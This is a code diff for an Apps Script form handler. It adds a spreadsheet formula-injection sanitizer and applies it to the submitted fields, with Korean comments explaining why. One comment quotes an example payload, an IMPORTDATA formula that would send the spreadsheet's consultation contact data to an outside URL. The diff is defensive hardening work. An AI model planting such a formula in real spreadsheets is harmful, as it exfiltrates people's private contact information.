@@ -98,11 +98,11 @@ function doPost(e) {
       const row = COLUMNS.map(function (c) {
         if (c === 'submitted_at') return new Date();            // 시각은 서버가 정본(클라이언트 시계 불신)
         if (c === 'ref_serial') return serial;
-        if (c === 'lang') return String(body.lang || '').slice(0, 8);
+        if (c === 'lang') return 셀안전_(String(body.lang || '').slice(0, 8));   // lang도 요청 본문 = 공격자 통제
         const v = data[c];
         if (v === true) return 'TRUE';
         if (v === false || v == null) return '';                // multi 미선택은 빈칸 — TRUE만 의미를 갖는다
-        return String(v).slice(0, MAX_CELL);
+        return 셀안전_(String(v).slice(0, MAX_CELL));            // ⚠ 소독 없이 쓰면 익명 POST가 라이브 수식이 된다(아래 함수 머리말)
       });
       sh.appendRow(row);
       props.setProperty(capKey, String(Number(props.getProperty(capKey) || 0) + 1));
@@ -139,6 +139,21 @@ function 크루_다음번호_(sh, today) {
     if (m && m[1] === today) max = Math.max(max, Number(m[2]));
   }
   return max + 1;
+}
+
+/* 수식 인젝션 차단 — 시트에 문자열로 들어갈 값은 전부 이 통로를 지난다.
+ *
+ * 왜 이 파일에 사본을 두나: crewcard는 메인과 **별도 clasp 프로젝트**라 상담AI.js의 셀안전_를
+ *   전역으로 못 쓴다. 규약(정규식·아포스트로피 접두)은 정본과 동일하게 유지한다 — 한쪽만 고치면 갈린다.
+ *
+ * 왜 필요한가(08-04 적대 리뷰가 특정한 실제 경로): 이 웹앱은 익명 POST를 토큰 없이 받고(의도),
+ *   쓰는 곳이 **상담 스프레드시트와 같은 파일**(CONSULT_SHEET_ID = Code.js:789와 동일)이다.
+ *   소독이 없으면 `crew_intro` 한 칸에 `=IMPORTDATA("https://…"&ENCODEURL(TEXTJOIN(…,'상담데이터입력'!H3:H200)))`
+ *   를 넣는 것만으로 같은 파일의 상담 연락처가 외부로 나간다 — 사람이 클릭할 필요조차 없다.
+ *   [v9.153] profiles 하드닝과 같은 계열이며, 여기가 공격 비용이 더 싸다(공개 폼·무인증). */
+function 셀안전_(v) {
+  const s = String(v == null ? '' : v);
+  return /^[=+\-@\t\r]/.test(s) ? ("'" + s) : s;
 }
 
 function 크루_응답_(obj) {
